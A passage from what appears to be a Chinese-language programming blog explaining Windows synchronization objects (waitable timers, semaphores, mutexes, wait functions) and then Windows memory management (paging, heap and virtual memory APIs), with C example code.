liUTC;// Create an auto-reset timer.hTimer = CreateWaitableTimer(NULL, FALSE, NULL);// First signaling is a January 1, 2018, at 1:00 P.M. (local time).st.wYear = 2019; // Yearst.wMonth = 9; // Januaryst.wDayOfWeek = 3; // Ignoredst.wDay = 6; // The first of the monthst.wHour = 13; // 1PMst.wMinute = 0; // 0 minutes into the hourst.wSecond = 0; // 0 seconds into the minutest.wMilliseconds = 0; // 0 milliseconds into the secondSystemTimeToFileTime(&amp;st, &amp;ftLocal);// Convet local time to UTC time.LocalFileTimeToFileTime(&amp;ftLocal, &amp;ftUTC);// Convert FILETIME to LARGE_INTEGER because of different alignment.liUTC.LowPart = ftUTC.dwLowDateTime;liUTC.HighPart = ftUTC.dwHighDateTime;// Set the timer.SetWaitableTimer(hTimer, &amp;liUTC, 6 * 60 * 60 * 1000, NULL, NULL, FALSE); 注意这里有一个FILETIME 和LARGE_INTEGER结构转换的问题 因为前者是32位对齐，后者是64位对齐。如果直接传递可能会导致对齐错误抛出一个（EXCEPTION_DATATYPE_MISALIGNMENT异常） 还可以给pDueTime传入一个相对时间，给其传入负值。（100纳秒的整数倍） 1秒 = 1000 毫秒 = 1000 000 微妙 = 10 000 000 （个 100 纳秒） 以下例子把计时器第一次触发时间设置为SetWaitableTimer调用结束的5秒钟后； 123456789101112131415161718// Declare our local variables.HANDLE hTimer;LARGE_INTEGER li;// Create an auto-reset timer.hTimer = CreateWaitableTimer(NULL, FALSE, NULL);// Set the timer to go off 5 seconds after calling SetWaitableTimer.// Timer unit is 100 nanoseconds.const int nTimerUnitsPerSecond = 10000000;// Negate the time so that SetWaitableTimer knows we// want relative time instead of absolute time.li.QuadPart = -(5 * nTimerUnitsPerSecond);// Set the timer.SetWaitableTimer(hTimer, &amp;li, 6 * 60 * 60 * 1000, NULL, NULL, FALSE); 对于一次性计时器，只要给lPeriod 传递0 。然后调用CloseHandle关闭计时器即可。 或者调用SetWaitableTimer来重置计时器。 bResume（TRUE） 会使的计算机结束挂起模式（如果机器处于挂起模式下）并唤醒等待该计时器的线程。 FALSE 计时器会被触发，但是在机器继续执行前（挂起状态），被唤醒的线程都得不到CPU时间。 取消计时器内核对象句柄所对应的计时器：CancelWaitableTimer 123456WINBASEAPIBOOLWINAPICancelWaitableTimer( _In_ HANDLE hTimer ); 另外每次调用SetWaitableTimer都会重置计时器。 一个倒计时的例子。从9倒计时到0 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#define _CRT_SECURE_NO_WARNINGS#include &lt;tchar.h&gt;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;Shlobj.h&gt;#include &lt;strsafe.h&gt;#include &lt;malloc.h&gt;#include &lt;process.h&gt;#include &lt;winnt.h&gt;#include &lt;ctype.h&gt; // Declare our local variables.HANDLE hTimer; unsigned __stdcall OnTimer(void * param) { int nCount = 10; while (nCount--) { WaitForSingleObject(hTimer, INFINITE); _tprintf(TEXT(&quot;count:\\t%d\\n&quot;), nCount); } return 0;} int _tmain(int argc, TCHAR* argv[], TCHAR * env[]){ LARGE_INTEGER li; // Create an auto-reset timer. hTimer = CreateWaitableTimer(NULL, FALSE, NULL); // Set the timer to go off 5 seconds after calling SetWaitableTimer. // Timer unit is 100 nanoseconds. const int nTimerUnitsPerSecond = 10000000; // Negate the time so that SetWaitableTimer knows we // want relative time instead of absolute time. li.QuadPart = -(5 * nTimerUnitsPerSecond); // Set the timer. SetWaitableTimer(hTimer, &amp;li, 1000, NULL, NULL, FALSE); // Create the OnTimer Thread unsigned int ThreadID; HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, OnTimer, NULL, NULL, &amp;ThreadID); WaitForSingleObject(hThread, INFINITE); system(&quot;pause&quot;); return 0;} 让可等待的计时器添加APC调用APC异步过程调用（asynchronous procedure call） SetWaitableTimer允许传入一个APC过程，触发了计时器会调用该过程。 当计时器触发时，当且仅当SetWaitableTimer调用的线程处于可提醒状态（Alertable stabe）（SleepEx, WaitForSingleObjectEx, WaitForMultipleObjectEx, MsgWaitForMultipleObjectEx,SignalObjectAndWait而进入的状态） 如果非处于可提醒状态，系统不会把计时器的APC函数添加到队列中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110// TimerAPCRoutine.cpp : 定义控制台应用程序的入口点。//#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;time.h&gt;using namespace std;void GetSystemTime();VOID CALLBACK TimerAPCRoutinue( _In_opt_ LPVOID lpArgToCompletionRoutine, _In_ DWORD dwTimerLowValue, _In_ DWORD dwTimerHighValue );int main(){ LARGE_INTEGER DueTime; DueTime.QuadPart = -30; HANDLE TimeHandle = NULL; TimeHandle = CreateWaitableTimer( NULL, //TRUE, //BOOL bManualReset FALSE, NULL ); if (!SetWaitableTimer( TimeHandle, &amp;DueTime, //第一次，The time after which the state of the timer is to be set to signaled 1000, //第二次执行与第一次执行的间隔 周期 1秒 The period of the timer TimerAPCRoutinue, NULL, 0 ) ) { printf(&quot;SetWaitableTimer FAIL: %d \\r\\n&quot;, GetLastError()); return 0; } //进入可提醒状态 可提醒IO /* while (1) { WaitForSingleObjectEx(TimeHandle, INFINITE,TRUE); } */ //这里的话只能走2次，应该是等待时间的问题 /* 指针放到APC中，还没有执行，后面一次就来了。要使用SleepEx 感觉这里WaitFoeSingleObjectEx 不同的地方 */ for (int i = 0; i &lt; 5; i++) { //WaitForSingleObjectEx(TimeHandle, INFINITE,TRUE); //阻塞不住 /* windows核心编程 p250 线程不应该在等待一个计时器句柄的同时以可提醒的方式等待同一个计时器。 HANDLE hTimer = CreateWaitableTimer(NULL,FALSE,NULL); SetWaitableTimer(hTimer,...,TimerAPCRoutinyr,...); WaitForSingleObjectEx(hTimer,INFINTE,TRUE); 我们不应该编写此类代码，因为对WaitForSingleObjectEx的调用 实际上会等待计时器两次：一次是可提醒的，另一次是内核对象句柄。 当计时器被触发的时候，等待成功，线程被唤醒，这使线程退出可提醒状态 APC函数没有被调用。我们一般很少有理由要在使用可等待计时器的同时使用APC函数， 因为我们总是可以先等待计时器被触发，然后在执行我们想要的操作。 */ SleepEx( INFINITE, // Wait forever TRUE); } printf(&quot;input any key to exit\\r\\n&quot;); getchar(); return 0;}VOID CALLBACK TimerAPCRoutinue( _In_opt_ LPVOID lpArgToCompletionRoutine, _In_ DWORD dwTimerLowValue, _In_ DWORD dwTimerHighValue ){ GetSystemTime();}void GetSystemTime(){ time_t t = time(0); char tmp[64]; strftime(tmp, sizeof(tmp), &quot;%Y/%m/%d %X %A 本年第%j天 %z&quot;, localtime(&amp;t)); puts(tmp);} 不应该同时使用等待函数又同时以可提醒的方式等待一个计时器。 例如 SetWaitableTimer(hTimer,…, TimerAPCRountine,…); WaitForSingleObjectEx(hTimer, INFINITE, TRUE); 计时器的剩余问题在通信协议中会大量用到计时器，但是通常为每个请求创建计时器内核对象，将严重影响系统性能。 有一个CreateThreadpoolTimer可以创建线程池函数对应的计时器。 大多数应用程序不使用APC， 而是使用IO完成端口 用户计时器SetTimer ：在应用程序中使用大量的用户界面基础设置，从而消费更多的资源。而且通过消息机制触发，只有一个线程能得到通知 （WM_TIMER不一定准时，因为其具有最低的优先级） 可等待计时器是内核对象，可以在多个线程间共享。多个线程可以得到通知。 信号内核对象信号量内核对象用来对资源进行计数，除了使用计数器。还包含（32bit值）一个最大资源计数和当前资源计数。 如果当前资源计数大于0，信号量处于触发状态。 如果当前资源计数等于0，信号量处于未触发状态。 创建信号量的函数CreateSemaphoreW 12345678910WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateSemaphoreW( _In_opt_ LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, _In_ LONG lInitialCount, _In_ LONG lMaximumCount, _In_opt_ LPCWSTR lpName ); psa pszName 参阅第三章 dwFlags是系统保留的设为0. 参数lMaximumCount 系统能够处理的资源的最大数量lInitialCoun 初始化有多少资源可用。例如给服务器进程初始化，没有客户端请求，因此使用一下代码来调用CreateSemaphore HANDLE hSemaphore = CreateSemaphore(NULL, 0, 5, NULL); 打开一个信号量openSemaphore 123456789WINBASEAPI_Ret_maybenull_HANDLEWINAPIOpenSemaphoreW( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpName ); dwDesiredAccess参数指定访问权限 线程通过调用ReleaseSemahore来递增信号量的当前资源计数： 12345678WINBASEAPIBOOLWINAPIReleaseSemaphore( _In_ HANDLE hSemaphore, _In_ LONG lReleaseCount, _Out_opt_ LPLONG lpPreviousCount ); lReleaseCount 的值会加到信号量当前资源计数上。 互斥量内核对象互斥量（mutex）内核对象用来确保一个线程独占一个资源的访问。 互斥量与临界区的行为完全相同。（内部保护递归计数） 互斥量的规则： 如果线程ID为0，那么互斥量不为任何线程所占用，它处于触发状态 如果线程ID为非零值，那么一个线程已经占用了该互斥量，它处与未触发状态。 与所有其他内核对象不同，操作系统对互斥量进行了特殊处理，允许它们违反一些常规的规则。（递归计数器的存在，运行同一个线程ID多次进入） 创建互斥量的函数CreateMutexW： 123456789WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateMutexW( _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_ BOOL bInitialOwner, _In_opt_ LPCWSTR lpName ); bInitialOwner控制互斥量的初始状态。FALSE， 互斥量的线程ID和递归计数都被设为0.处于触发状态。 给bInitialOwner穿TRUE，那么对象的线程ID被设为调用线程的ID，递归计数器被设为1.（未触发状态） 或者使用CreateMutexEx: 12345678910WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateMutexExW( _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_opt_ LPCWSTR lpName, _In_ DWORD dwFlags, _In_ DWORD dwDesiredAccess ); dwDesiredAccess指定访问权限 dwFlags（代替bInitialOwned） 0表示FALSE， CREATE_MUTEX_INITIAL_OWNER等价于TRUE 另一个进程可以调用OpenMutex来得到一个已经存在的互斥量句柄。 123456789WINBASEAPI_Ret_maybenull_HANDLEWINAPIOpenMutexW( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpName ); BOOL ReleaseMutex(HANDLE hMutex); 使互斥量对象的递归计数器减1， 当递归计数器为0时，还会设置线程ID为0，这就触发了对象。 释放问题互斥量具有线程所有权的功能，即使未触发也能多次进入。 如果占用互斥量的线程在释放互斥量之前终止（ExitThread ，TerminateThread ，ExitProcess 或TerminateProcess） 系统认为互斥量被遗弃（abandoned） 此时会自动将互斥量线程ID设为0，递归计数器设为0，并检查有没有正在等待该互斥量的线程。 等待函数返回WAIT_ABANDONED(只适用互斥量） 互斥对象与关键代码段的比较 互斥量的任意时间长度等待修正为： WaitForSingleObject(hmtx, dwMilliseconds); 线程同步对象速查表 其他的线程同步函数Wa i t F o r S i n g l e O b j e c t和Wa i t F o r M u l t i p l e O b j e c t s是进行线程同步时使用得最多的函数。但是，Wi n d o w s还提供了另外几个稍有不同的函数。 异步设备I/O步设备IO（asynchronous device I/O）允许线程开始读取操作或写入操作，但不必等待读取操作或写入操作完成。 设备对象是是可同步的内核对象，可以调用WaitForSingleObject并传入句柄，套接字，通信端口等。 WaitForInputIdle线程可以调用此函数将自己挂起 123456WINUSERAPIDWORDWINAPIWaitForInputIdle( _In_ HANDLE hProcess, _In_ DWORD dwMilliseconds); 常用于等待子进程，父进程知道子进程已经初始化完毕的唯一方法，就是等待子进程，直到它不再处理任何输入为止。 当我们要强制在应用程序中输入一些按键的时候，也可以使用WaitForInputIdle。 当向目标进程发送一系列按键消息以后，调用WaitForInputIdle等待其处理完按键消息，然后再发送后续的按键消息。 MsgWaitForMultipleObjects(Ex)12345678910111213141516171819WINUSERAPIDWORDWINAPIMsgWaitForMultipleObjects( _In_ DWORD nCount, _In_reads_opt_(nCount) CONST HANDLE *pHandles, _In_ BOOL fWaitAll, _In_ DWORD dwMilliseconds, _In_ DWORD dwWakeMask); WINUSERAPIDWORDWINAPIMsgWaitForMultipleObjectsEx( _In_ DWORD nCount, _In_reads_opt_(nCount) CONST HANDLE *pHandles, _In_ DWORD dwMilliseconds, _In_ DWORD dwWakeMask, _In_ DWORD dwFlags); 函数功能:阻塞时仍可以响应消息 MsgWaitForMultipleObjects()函数类似WaitForMultipleObjects()， 但它会在“对象被激发”或“消息到达队列”时被唤醒而返回。 MsgWaitForMultipleObjects()多接收一个参数，允许指定哪些消息是观察对象。一个应用的例子 该函数同时等待对象，若有消息到底也返回。运行主线程处理消息后继续等待。 123456789101112131415161718192021222324252627282930313233343536373839DWORD dwRet = 0;MSG msg;DWORD dwStartTime = GetTickCount();while (TRUE){ //超时判断 5s dwRet = GetTickCount() - dwStartTime; if ((GetTickCount() - dwStartTime) &gt; 10000) { AfxMessageBox(_T(&quot;获取数据超时，请检测设备网络连接!&quot;), MB_OK | MB_ICONERROR); return NULL; } //wait for m_hThread to be over，and wait for //QS_ALLINPUT（Any message is in the queue） //dwRet = WaitForSingleObject(g_hRetEvent, INFINITE); dwRet = MsgWaitForMultipleObjects(1, &amp;g_hRetEvent, FALSE, 100, QS_ALLINPUT); switch (dwRet) { case WAIT_OBJECT_0: //返回数据达到 break; //break the loop case WAIT_OBJECT_0 + 1: //界面消息 //get the message from Queue //and dispatch it to specific window if (PeekMessage(&amp;msg, NULL, 0, 0, PM_REMOVE)) { TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); } continue; case WAIT_TIMEOUT: //超时 continue; default: AfxMessageBox(_T(&quot;数据获取失败，未知错误!&quot;), MB_OK | MB_ICONERROR); return NULL; break; // unexpected failure } break;} WaitForDebugEvent调试器Attach到被调试程序以后，调用WaitForDebugEvent来等待调试事件。 1234567WINBASEAPIBOOLAPIENTRYWaitForDebugEvent( _Out_ LPDEBUG_EVENT lpDebugEvent, _In_ DWORD dwMilliseconds ); SignalObjectAndWait函数12345678910WINBASEAPIDWORDWINAPISignalObjectAndWait( _In_ HANDLE hObjectToSignal, _In_ HANDLE hObjectToWaitOn, _In_ DWORD dwMilliseconds, _In_ BOOL bAlertable ); 使用一个原子操作来触发一个内核对象，并等待另一个内核对象。hObjectToSignal必须是一个互斥量，信号量或事件。（其他任何对象将导致函数返回WAIT_FAILD）调用GetLastError返回ERROR_INVALID_HANDLE. hObjectToWaitOn可以是互斥量，信号量，事件，进程，线程，作业，控制台输入变更通知，作业。等等 dwMilliseconds 函数最多花多长时间来等待。 bAlertable表示当线程处于等待状态的时候，是否能够堆添加到队列中的异步过程调用进行处理。 返回值：WAIT_OBJECT_0, WAIT_TIMEOUT, WAIT_FAILED, WAIT)ABANDONED, WAIT_IO_COMPLETION 配合PulseEvent使用。 SignalObjectAndWait释放一个对象，同时立即等待（原子方式） 能确保其100%能看见别的线程调用的PulseEvent。 使用等待链遍历API来检测死锁Vista系统以上提供了等待链遍历（Wait Chain Traversal， WCT）API，这些函数可以让我们列出所有的锁，并检测进程内部，甚至是进程之间的死锁。","link":"/2019/09/03/Windows-Kernel-9/"},{"title":"Windows应用程序-内存管理","text":"内存主要存储程序运行时所需的机器代码、数据等内容。内存是计算机运行的必要条件。 Windows内存管理数据是存储在内存中的，为了能够找到存在于内存中的数据，我们需要知道哪些数据的内存地址。内存的最小单元是字节，内存中的每一个字节都有一个地址。 基本概念地址空间系统中所有可用的内存地址的集合称为地址空间。 物理内存硬件系统中真实存在的存储空间称为物理内存，物理内存的访问通过硬件系统总线进行的。 虚拟地址空间为了访问内存的统一和方便，操作系统允许其上运行的程序访问所有的4GB内存空间中的地址。因此操作系统必须进行一些必要的地址转换工作，将程序访问的地址转换为物理内存中的真实物理地址，然后进行数据的存取。操作系统进行转换后，供程序使用的地址空间称为虚拟地址空间。 进程的内存空间Windows操作系统中每个进程都有自己的虚拟地址空间。32位的操作系统将4GB的虚拟内存划分为两个部分，进程使用2TB，称为用户进程空间；内核使用2GB，称为系统地址空间。虚拟地址在进程上是封闭的，进程只能访问自己的地址空间，如果要访问其他进程的地址空间需要特殊的机制 Windows内存管理知识： 分段与分页内存管理 物理地址与虚拟地址、虚拟地址空间 虚拟内存布局，内存的分工，堆与栈 内存的存取权限 标准C内存管理函数与Windows内存管理API的关系 分页与分段内存管理在Intel x86体系结构CPU中，有若干个段寄存器，可以通过段”选择器+偏移”的形式来表示内存地址。使用这种方式表示的逻辑称为”逻辑地址”，这种机制称为”分段”。系统会将逻辑地址转换为线性地址。 线性地址与物理内存地址类似，是平坦的(未分段)，使用32位数表示，地址是连续的。 分页机制： 32位地址的高10位移为目录索引(Directory)、次10位称为页表索引(Table)，余下的12位为偏移(Offset)。如果只取前两部分的20位，末位补0，那么其指向的地址都是4KB对其的，也就是页的基地址。所以前32位中的前20位定位了页的基地址(PFN)，而最后12位是地址在页内的偏移。 地址转换如下： 从CR3寄存器的12~32位中取出地址，末尾补0，构成一个32位的地址，此地址是页目录所在物理内存的基地址（4KB对其）。 以线性地址中的高10位的页目录索引中数据为偏移，加上上一步得到的页目录所在物理内存的基地址，在页目录中找到相对应的页目录项。 页目录项包括了页表的基地址，线性地址中的页表索引(Table)是也表中的偏移，找到页表项。 页表项中存储的是物理地址中页面的地址，如果页面地址指向的页面是无效的，那么会在系统内核中引起页错误，系统内核会进行页面调度，将物理内存中暂不适用的页面交换到硬盘中。 现在已经找到了线性地址所对应的物理地址所在的页的基址 在物理页地址的基础上，加上线性地址末12位的偏移，可得到线性地址与物理地址的对应。 进程的内存空间进程虚拟地址空间的实现Windows系统中每个进程都有一个私有的虚拟地址空间，系统将每个进程的虚拟地址都映射到屋里内存地址上，为了实现系统中每个进程都有一个私有的虚拟地址空间，系统为每个进程都创建一个页目录和一组页表。每个进程的页表是独立的，而内核空间的页表是所有进程共享的。 CR3寄存器标识了页目录所在的物理地址。Windows系统上的第一个进程都有独立的页目录，因此系统运行时，CR3寄存器中保存的页目录地址是会变化的，其值为当前运行的进程的页目录地址。 数据共享与保护在一些进程间共享的数据、系统的可执行代码(DLL)等，在各个进程间是一致的，因此没有必要在物理内存中为这些数据保存多分，不同进程的虚拟内存分页可以映射为同样的物理内存分页。 需要了解内容 虚拟地址空间中的数据是分页管理的 应用程序不用考虑系统中其他程序的内存使用情况 虚拟地址并不是物理地址空间中的地址，不是数据在内存中真实存在的地址，操作系统会将进程的虚拟地址映射到真实的物理内存的地址 进程不需要考虑真是内存多大，只需要了解使用2GB的内存，操作系统负责转换 如果系统中没有足够的物理内存使用，那么操作系统会把当前没有使用的内存分页”调度”到硬盘上保存起来。 虚拟内存布局、内存的分工、堆栈进程的虚拟内存空间分为两部分，低2GB由用户程序使用，高2GB由系统内核使用。 系统内核的空间包括驱动程序，系统内核可执行文件，用于内存管理的数据结构，用于进程管理、线程调度的数据结构、各种中断处理程序，系统缓存等。 栈和堆是两种重要的内存管理形式 进程都有自己的栈，栈与函数调用、执行和返回及己不变量的保存相关，一般情况下，栈中保存着函数的参数、返回地址和局部变量，调用函数之前先将参数入栈，调用指令将函数返回地址入栈，被调用函数负责保存调用函数相关栈指针，为局部变量分配空间等。 堆是一种可以动态分配是释放的内存，由堆管理器进行管理。 内存的保护属性和存取权限系统为每个内存分页提供保护权限和存取权限，内存的保护属性和存取权限的最小单位是分页，也就是说同一个分页中的内存必然具有相同的保护属性和存取权限。 主要API 堆管理用户使用内存分配函数分配的内存都位于堆中，所以使用堆管理函数对内存进行分配、释放等方式是最为直接的。 Windows中，每个进程都有自己的堆，每个进程的堆的数量也有所不同。Windows中的堆并不是内存块，而是一种用于内存管理的对象，也是一种内存组织的形式。进程可以从属于自己的堆上分配内存和释放内存。 获取堆句柄、分配与再分配堆堆是一种内存管理的对象，一个进程有若干个堆，在分配内存前需要指定从哪个堆上进行分配。堆的句柄唯一标识了一个堆。在堆上分配之前，需要获取进行分配的堆的句柄，获取句柄的方式有两种：一种是获取在进程中时已经创建好的堆，二是进程自己再创建堆 HeapCreate为进程创建新堆，请求分配虚拟内存分页 12345HANDLE HeapCreate( DWORD flOptions, //创建堆的选项 SIZE_T dwInitialSize, //堆的初始值大小 SIZE_T dwMaximumSize //堆大小的最大值); 创建堆的选项： GetProcessHeap获取进程当前的一个堆，返回堆的句柄。 1HANDLE GetProcessHeap(); GetProcessHeaps获取进程中所有堆，包括堆数量和各个堆的句柄 1234DWORD GetProcessHeaps( DWORD NumberOfHeaps, //缓冲区ProcessHeaps所能存储的句柄值得个数 PHANDLE ProcessHeaps //指向用于保存进程中所有堆得句柄得内存块，函数返回地句柄值会在其中依此保存); HeapAlloc从指定得堆上分配内存块 12345DECLSPEC_ALLOCATOR LPVOID HeapAlloc( HANDLE hHeap, //此参数指定得堆上进行内存分配 DWORD dwFlags, //需要分配得标志 SIZE_T dwBytes //需要分配得内存区域大小，字节单位); LPVOID类型得数据，如果成功，指向新分配得内存得指针，如果失败，则为NULL HeapReAlloc重新分配内存，改变已经分配好的堆内存块得大小 123456DECLSPEC_ALLOCATOR LPVOID HeapReAlloc( HANDLE hHeap, //此参数指定得堆上进行内存分配 DWORD dwFlags, //内存分配标志 _Frees_ptr_opt_ LPVOID lpMem, //原内存得地址 SIZE_T dwBytes //内存块调整后得值); GetSystemInfo123void GetSystemInfo( LPSYSTEM_INFO lpSystemInfo //指向SYSTEM_INFO结构体，保存获取得信息); Demo123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127/* 头文件 */#include &lt;windows.h&gt;#include &lt;stdio.h&gt;/************************************** DWORD PrintHeapSize(HANDLE hHeap,LPVOID lpMem)* 功能 获取堆的大小并打印出来** 参数 HANDLE hHeap，堆句柄* LPVOID lpMem，内存地址指针** 返回值 0代表执行完成，1代码发生错误。**************************************/DWORD PrintHeapSize(HANDLE hHeap, LPVOID lpMem){ SIZE_T dwHeapSize; dwHeapSize = HeapSize(hHeap, HEAP_NO_SERIALIZE, lpMem); if (dwHeapSize == -1) { printf(&quot;Get HeapSize error :%d&quot;, GetLastError()); return 1; } printf(&quot;内存块大小为:0x%x\\n&quot;, dwHeapSize); return 0;}/************************************** int main(int argc, PCHAR argv[])* 功能 演示堆的使用** 参数 argv[1]如果为“-s”那么使用进程堆* argv[1]如果为“-a”那么创建一个可变大小的堆* argv[1]如果为其他，那么创建有最大大小的堆。****************************************/int main(int argc, PCHAR argv[]){ SYSTEM_INFO si; //系统信息 HANDLE hHeap; //堆句柄 LPVOID lpMem; //内存块指针 LPVOID lpReAlloc; //内存块大小调整后的指针 DWORD dwHeapSize; //堆内存埠大小 HANDLE hHeaps[24]; //用于保存进程中所有的堆句柄 DWORD dwHeapNum; //进程中堆的数量\\ //获取系统信息 GetSystemInfo(&amp;si); //将系统内存分页大小，与内存分配粒度打印出来。 printf(&quot;系统内存页大小: 0x%x\\n系统内存分配粒度:0x%x\\n&quot;, si.dwPageSize, si.dwAllocationGranularity); //分析输入参数，如果是“-a”创建一个最大为10个分页大小的堆 if (argc == 2 &amp;&amp; 0 == lstrcmp(argv[1], &quot;-a&quot;)) { hHeap = HeapCreate(HEAP_NO_SERIALIZE, si.dwPageSize, si.dwPageSize * 10); printf(&quot;创建堆,初始化大小为1页,最大为10页\\n&quot;); } //如果输入参数为“-s”使用进程初始化时已经存在的堆 else if (argc == 2 &amp;&amp; 0 == lstrcmp(argv[1], &quot;-s&quot;)) { hHeap = GetProcessHeap(); printf(&quot;获取系统已经存在的堆\\n&quot;); } //如果输入其他，创建一个可增长的堆 else { hHeap = HeapCreate(HEAP_NO_SERIALIZE, 0, 0); printf(&quot;创建堆,初始化大小为1页,大小可变\\n&quot;); } //判断堆是否创建/获取成功 if (hHeap == NULL) { printf(&quot;创建或获取进程堆错误: %d&quot;, GetLastError()); return 1; } //获取将打印当前进程中一共有多少个堆，有没有新建堆，值会不同 dwHeapNum = GetProcessHeaps(24, hHeaps); if (dwHeapNum == 0) { printf(&quot;GetProcessHeaps error: %d&quot;, GetLastError()); } else { printf(&quot;当前进程一共有%d个堆\\n&quot;, dwHeapNum); } //在堆上分析内存，3个页面大小 lpMem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, si.dwPageSize * 3); if (lpMem == NULL) { printf(&quot;HeapAlloc error: %d&quot;, GetLastError()); return 1; } printf(&quot;在堆上成功分配内存,起始地址为:0x%x\\n&quot;, lpMem); //打印当前堆内存块的大小 PrintHeapSize(hHeap, lpMem); //再分配内存，调整内存的大小为11个分页大小， //如果使用第一种方法创建堆，这里会出错 lpReAlloc = HeapReAlloc(hHeap, HEAP_ZERO_MEMORY, lpMem, si.dwPageSize * 11); if (lpReAlloc == NULL) { printf(&quot;HeapReAlloc error: %d&quot;, GetLastError()); return 1; } printf(&quot;在堆上再分配内存,地址为:0x%x,原地址:0x%x\\n&quot;, lpReAlloc, lpMem); //打印调整大小后的堆内存块大小 PrintHeapSize(hHeap, lpReAlloc); //释放内存 if (!HeapFree(hHeap, HEAP_NO_SERIALIZE, lpReAlloc)) { printf(&quot;HeapFree error: %d&quot;, GetLastError()); return 1; } printf(&quot;释放内存成功\\n&quot;); //如果新建了堆，销毁堆。 if (argc != 2 || 0 != lstrcmp(argv[1], &quot;-s&quot;)) { printf(&quot;销毁HeapCreate创建的堆\\n&quot;); if (!HeapDestroy(hHeap)) { printf(&quot;HeapDestroy error: %d&quot;, GetLastError()); return 1; } printf(&quot;销毁堆成功\\n&quot;); } return 0;} 获取堆中内存块大小信息API函数HeapSize得作用是获取堆中内存块大小得信息 HeapSize12345SIZE_T HeapSize( HANDLE hHeap, //需要获得大小得内存块所在堆得句柄 DWORD dwFlags, //内存块得标志 LPCVOID lpMem //所需要获取大小得内存块得指针); Demo123456789101112DWORD PrintHeapSize(HANDLE hHeap, LPVOID lpMem){ SIZE_T dwHeapSize; dwHeapSize = HeapSize(hHeap, HEAP_NO_SERIALIZE, lpMem); if (dwHeapSize == -1) { printf(&quot;Get HeapSize error :%d&quot;, GetLastError()); return 1; } printf(&quot;内存块大小为:0x%x\\n&quot;, dwHeapSize); return 0;} 释放内存、销毁堆分配得内存在使用完成后需要释放，否则内存将不能再次使用，造成内存泄漏 HepFree释放HeapAlloc和HeapReAlloc所分配得内存 12345BOOL HeapFree( HANDLE hHeap, //内存块所在得堆，需要使用HeapAlloc和HeapReAlloc分配内存时候同样得堆 DWORD dwFlags, //内存块标志 _Frees_ptr_opt_ LPVOID lpMem //所需要释放得内存块得指针); HeapDestroy销毁由HeapCreate创建得堆 123BOOL HeapDestroy( HANDLE hHeap //销毁堆得句柄); Demo1234567891011121314151617if (!HeapFree(hHeap, HEAP_NO_SERIALIZE, lpReAlloc)){ printf(&quot;HeapFree error: %d&quot;, GetLastError()); return 1;}printf(&quot;释放内存成功\\n&quot;);//如果新建了堆，销毁堆。if (argc != 2 || 0 != lstrcmp(argv[1], &quot;-s&quot;)){ printf(&quot;销毁HeapCreate创建的堆\\n&quot;); if (!HeapDestroy(hHeap)) { printf(&quot;HeapDestroy error: %d&quot;, GetLastError()); return 1; } printf(&quot;销毁堆成功\\n&quot;);} 全局和局部内存管理32位Windows系统中并没有区分全局堆和局部堆，Windows系统中之所以留着是为了兼容16位。 Demo12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;windows.h&gt;#include &lt;stdio.h&gt;/************************************** int main(void)* 功能 演示Global*函数的使用** 参数 无***************************************/int main(void){ LPVOID lpMem; //内存地址 HGLOBAL hMem; //内存句柄 SIZE_T sizeMem; //内存大小 UINT uFlags; //属性 //分配内存 lpMem = (LPVOID)GlobalAlloc(GPTR,1000); //将数据复制到内存中 lstrcpy(lpMem,&quot;this is a string&quot;); //获得内存属性，打印 uFlags = GlobalFlags(lpMem); printf(&quot;内存中的内容：\\&quot;%s\\&quot;，内存地址：0x%.8x，内存属性：%u\\n&quot;, lpMem,lpMem,uFlags); //释放 GlobalFree(lpMem); //分配内存，获取信息 hMem = GlobalAlloc(GMEM_MOVEABLE,1000); sizeMem = GlobalSize(hMem); uFlags = GlobalFlags(hMem); //打印信息 printf(&quot;内存大小：%d，内存句柄：0x%.8x，内存属性：%u\\n&quot;, sizeMem,hMem,uFlags); //锁定 lpMem = GlobalLock(hMem); //释放 GlobalFree(hMem); return 0;} 虚拟内存管理虚拟地址空间与内存分页内存管理得原理都由系统得内存管理器实现，应用程序只能管理属于自己得虚拟地址空间。 进程得虚拟地址空间内存页面存在3种状态，分别为空闲得(Free)、保留(Reserved)、提交(Committed)，一般一页得大小是4KB 状态 状态 空间(free) 进程不能访问这种页面，因此这次页面还没有被分配，任何属于这种自己得虚拟 内存进行访问都将引用访问以尝 保留(Reserved) 页面被保留以备将来只用，这些页面已经被分配，但是还没有被使用，物理地址空 间中得内存不存在与其对应得物理内存分页，处理保留状态得内存分页不能被访问 提交(Committed) 内存已经被分配，并且已经被使用，且有与之对应得物理地址空间中得内存分页 分配和释放可读可写得虚拟内存页面在使用VirtualAlloc和VirtualAllocEx分配虚拟内存时，可以自定分配得内存页面是保留得还是提交得。 VirtualAlloc123456LPVOID VirtualAlloc( LPVOID lpAddress, //分配得起始位置，如果是要保留一段内存区域，那么函数会自动向其最近得一个分配粒度对其 SIZE_T dwSize, //所需要分配得内存区域大小 DWORD flAllocationType, //分配得类型，决定了是保留一段内存区域还是提交。还是同时王城 DWORD flProtect //内存得保护属性); VirtualFree将内存状态从”已提交得”变成”保留得”，此函数用于进行VirtualAlloc反向工作 12345BOOL VirtualFree( LPVOID lpAddress, //需要改变状态得内存区域得起始地址 SIZE_T dwSize, //需要改变状态得内存区域得大小 DWORD dwFreeType //内存状态); VirtualFreeEx释放由VirtualAllocEx分配得内存 123456BOOL VirtualFreeEx( HANDLE hProcess, //进程得句柄 LPVOID lpAddress, 